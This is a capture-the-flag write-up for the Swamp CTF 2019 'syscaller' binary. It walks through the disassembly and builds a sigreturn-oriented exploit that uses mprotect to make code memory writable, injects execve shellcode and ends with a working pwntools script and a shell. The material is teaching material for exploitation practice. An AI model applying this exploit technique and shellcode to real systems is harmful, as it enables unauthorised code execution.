# Swamp ctf 2019 syscaller

Let's take a look at the binary:

```
$    file syscaller
syscaller: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, BuildID[sha1]=15d03138700bbfd52c735087d738b7433cfa7f22, not stripped
$    pwn checksec syscaller
[*] '/Hackery/pod/modules/srop/swamp19_syscaller/syscaller'
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
$    /syscaller
Hello and welcome to the Labyrinthe. Make your way or perish.
15935728
```

So we can see that we are dealing with a `64` bit binary, with non of the standard binary mitigations. When we run it, it prompts us for input.

## Reversing

When we through the binary in Ghidra, we see that it looks like another custom assembled binary. When we look at the `entry` function, we see this:

```
                             //
                             // .text
                             // SHT_PROGBITS  [0x4000e0 - 0x40016d]
                             // ram: 004000e0-0040016d
                             //
                             **************************************************************
                             *                          FUNCTION                          *
                             **************************************************************
                             undefined entry()
             undefined         AL:1           <RETURN>
                             _start                                          XREF[3]:     Entry Point(*), 00400018(*),
                             entry                                                        _elfSectionHeaders::00000090(*)  
        004000e0 55              PUSH       RBP
        004000e1 48 89 e5        MOV        RBP,RSP
        004000e4 48 81 ec        SUB        RSP,0x200
                 00 02 00 00
        004000eb bf 01 00        MOV        EDI,0x1
                 00 00
        004000f0 48 be 30        MOV        RSI,msg1                                         = 48h    H
                 01 40 00
                 00 00 00 00
        004000fa ba 3e 00        MOV        EDX,0x3e
                 00 00
        004000ff b8 01 00        MOV        EAX,0x1
                 00 00
        00400104 0f 05           SYSCALL
        00400106 b8 00 00        MOV        EAX,0x0
                 00 00
        0040010b 48 89 e6        MOV        RSI,RSP
        0040010e bf 00 00        MOV        EDI,0x0
                 00 00
        00400113 ba 00 02        MOV        EDX,0x200
                 00 00
        00400118 0f 05           SYSCALL
        0040011a 41 5c           POP        R12
        0040011c 41 5b           POP        R11
        0040011e 5f              POP        RDI
        0040011f 58              POP        RAX
        00400120 5b              POP        RBX
        00400121 5a              POP        RDX
        00400122 5e              POP        RSI
        00400123 5f              POP        RDI
        00400124 0f 05           SYSCALL
        00400126 b8 3c 00        MOV        EAX,0x3c
                 00 00
        0040012b 48 31 ff        XOR        RDI,RDI
        0040012e 0f 05           SYSCALL
```

We can see, it starts off by moving the stack down by `0x200` bytes. Then it sets up a write syscall to `stdout` (which is what causes us to see that output message). Proceeding that it sets up a read syscall which will allow us to scan in `0x200` bytes via stdin to the top of the stack (where `rsp` is). After that, it will pop values off of the stack into the `r12`, `r11`, `rdi`, `rax`, `rbx`, `rdx`, `rsi`, and `rdi` registers and make a syscall. So we get a syscall where we control a lot of the registers. After that it will make an exit syscall.

## Exploitation

So for the exploit, we will have to do several things. We will use the `syscall` that is preceeded by a bunch of `pop` instructions to execute a sigreturn, which will give us code execution. However there is one problem with that.

#### Remapping Memory Regions

Let's take a look at the memory mappings:

```
gef➤  vmmap
Start              End                Offset             Perm Path
0x0000000000400000 0x0000000000401000 0x0000000000000000 r-x /Hackery/pod/modules/srop/swamp19_syscaller/syscaller
0x00007ffff7ffb000 0x00007ffff7ffe000 0x0000000000000000 r-- [vvar]
0x00007ffff7ffe000 0x00007ffff7fff000 0x0000000000000000 r-x [vdso]
0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rwx [stack]
0xffffffffff600000 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]
gef➤  
```

So we can see that the only writable memory region by default is the stack. Thing is, we need to write the string `/bin/sh` somewhere in memory at an address we know in order to call it. So starting off the only region we can write to is the stack. However when the syscall is executed, the only real stack addresses we have are stored in the `rbp` and `rsp` registers, which are overwritten by the sigreturn. We can't use the syscall to give us an inofleak, because if it does it will continue on to the exit syscall before we actually get code execution. So by using the sigreturn, we effectively lose our only really stack addresses (stored in `rbp` and `rsp`). Also when we check the stack to see what's in range of our input for a potential leak, we come up with nothing:

```
gef➤  x/65g 0x7fffffffde68
0x7fffffffde68:    0x3832373533393531    0xa
0x7fffffffde78:    0x0    0x0
0x7fffffffde88:    0x0    0x0
0x7fffffffde98:    0x0    0x0
0x7fffffffdea8:    0x0    0x0
0x7fffffffdeb8:    0x0    0x0
0x7fffffffdec8:    0x0    0x0
0x7fffffffded8:    0x0    0x0
0x7fffffffdee8:    0x0    0x0
0x7fffffffdef8:    0x0    0x0
0x7fffffffdf08:    0x0    0x0
0x7fffffffdf18:    0x0    0x0
0x7fffffffdf28:    0x0    0x0
0x7fffffffdf38:    0x0    0x0
0x7fffffffdf48:    0x0    0x0
0x7fffffffdf58:    0x0    0x0
0x7fffffffdf68:    0x0    0x0
0x7fffffffdf78:    0x0    0x0
0x7fffffffdf88:    0x0    0x0
0x7fffffffdf98:    0x0    0x0
0x7fffffffdfa8:    0x0    0x0
0x7fffffffdfb8:    0x0    0x0
0x7fffffffdfc8:    0x0    0x0
0x7fffffffdfd8:    0x0    0x0
0x7fffffffdfe8:    0x0    0x0
0x7fffffffdff8:    0x0    0x0
0x7fffffffe008:    0x0    0x0
0x7fffffffe018:    0x0    0x0
0x7fffffffe028:    0x0    0x0
0x7fffffffe038:    0x0    0x0
0x7fffffffe048:    0x0    0x0
0x7fffffffe058:    0x0    0x0
0x7fffffffe068:    0x0
```

My solution to this is to remap the binary segment (`0x400000 - 0x401000`) to the permissions `rwx`, so we can read write and execute to that segment. I will do this using an `mprotect` syscall, which allows me to assign permissions to a memory region. For that, we will need to have the following register values set:

```
rax:    0xa (specify memprotect syscall)
rdi:    0x400000 (specify beginning of the binary's data segment)
rsi:    0x1000 (specify to apply the permissions to the chunk of this length, which covers the entire memory segment)
rdx:    0x7 (standard unix permission for read write and execute, read is 4, write is 2, execute is 1)
```

When we make that syscall, we see that we are able to remap the permissions to be `rwx` from `r-x`:

```
gef➤  vmmap
Start              End                Offset             Perm Path
0x0000000000400000 0x0000000000401000 0x0000000000000000 rwx /Hackery/pod/modules/srop/swamp19_syscaller/syscaller
0x00007fff39c9e000 0x00007fff39cbf000 0x0000000000000000 rwx [stack]
0x00007fff39ddd000 0x00007fff39de0000 0x0000000000000000 r-- [vvar]
0x00007fff39de0000 0x00007fff39de1000 0x0000000000000000 r-x [vdso]
0xffffffffff600000 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]
```

Also for which syscall to use, I choose `0x400104`. The reason for this, is immediately after that is a read syscall into `rsp` that we will use. When we do the initial sigreturn, we will set `rsp` to be equal to `0x40011a`, which is the instruction pointer immediately after the `syscall` to scan in our data. The reason for this, is that we are just going to overwrite the instructions there with our shellcode. That way after that syscall is finished executing, it will just run our shellcode and we will get a shell!

## Exploit

Putting it all together, we have the following exploit:

```
from pwn import *

# Establish the target
target = process("./syscaller")
#gdb.attach(target, gdbscript='b *0x400104')

context.arch = "amd64"

# Initial registers to be popped
r12 = "0"*8
r11 = "1"*8
rdi = "0"*8
rax = p64(0xf)
rbx = "0"*8
rdx = "1"*8
rsi = "0"*8
rdi = "1"*8

# Form the payload for the registers to be popped
payload = ""
payload += r12
payload += r11
payload += rdi
payload += rax
payload += rbx
payload += rdx
payload += rsi
payload += rdi

# Make the sigreturn frame
frame = SigreturnFrame()

frame.rip = 0x400104
frame.rax = 0xa
frame.rdi = 0x400000
frame.rsi = 0x1000
frame.rdx = 0x7

frame.rsp = 0x40011a

# Append the sigreturn frame to the payload
payload += str(frame)

# Send the payload
target.sendline(payload)

# A Raw input for I/O purposes
raw_input()

# Send our shellcode
# I did not write this shellcode, it is from: https://teamrocketist.github.io/2017/09/18/Pwn-CSAW-Pilot/
shellcode = "\x31\xf6\x48\xbf\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdf\xf7\xe6\x04\x3b\x57\x54\x5f\x0f\x05"
target.sendline(shellcode)

# Drop to an interactive shell
target.interactive()
```

When we run it:

```
$    python exploit.py
[+] Starting local process './syscaller': pid 16165
input
[*] Switching to interactive mode
Hello and welcome to the Labyrinthe. Make your way or perish.
$ w
 02:45:51 up  7:59,  1 user,  load average: 1.33, 1.19, 1.10
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
guyinatu :0       :0               18:47   ?xdm?  43:02   0.00s /usr/lib/gdm3/gdm-x-session --run-script env GNOME_SHELL_SESSION_MODE=ubuntu /usr/bin/gnome-session --session=ubuntu
$ ls
ROPgadget.py  core  exploit.py    readme.md  syscaller
$  
```

Just like that, we got a shell!